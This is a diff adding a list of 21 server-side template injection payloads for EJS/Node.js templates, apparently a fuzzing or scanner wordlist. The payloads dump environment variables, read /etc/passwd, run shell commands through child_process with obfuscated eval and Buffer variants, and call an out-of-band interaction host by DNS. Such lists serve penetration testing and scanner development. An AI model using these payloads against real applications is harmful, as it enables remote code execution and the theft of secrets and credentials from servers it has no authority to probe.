@@ -1,0 +1,21 @@
+<%= 7*7 %>
+<%= process.env %>
+<%= process.env.NODE_ENV %>
+<%= global.process.env %>
+<%= require('child_process').execSync('id').toString() %>
+<%= require('fs').readFileSync('/etc/passwd').toString() %>
+<% var cp = require('child_process'); cp.exec('id'); %>
+<%= Object.keys(process.env).join(',') %>
+<%= global %>
+<%= global.constructor %>
+<%= global.__proto__ %>
+<%= JSON.stringify(process.env) %>
+<%= this.constructor.constructor('return process.env')() %>
+<% eval(Buffer.from('require("child_process").exec("id")').toString()) %>
+<%= require('os').hostname() %>
+<%= require('os').platform() %>
+<%= require('dns').lookup('INTERACTSH_URL',console.log) %>
+<%- require('child_process').execSync('id') %>
+<%- include('/etc/passwd') %>
+<% var x = eval; x('require("child_process").exec("id")') %>
+<%= (function(){var n=require;return n('child_process').execSync('id').toString()})() %>
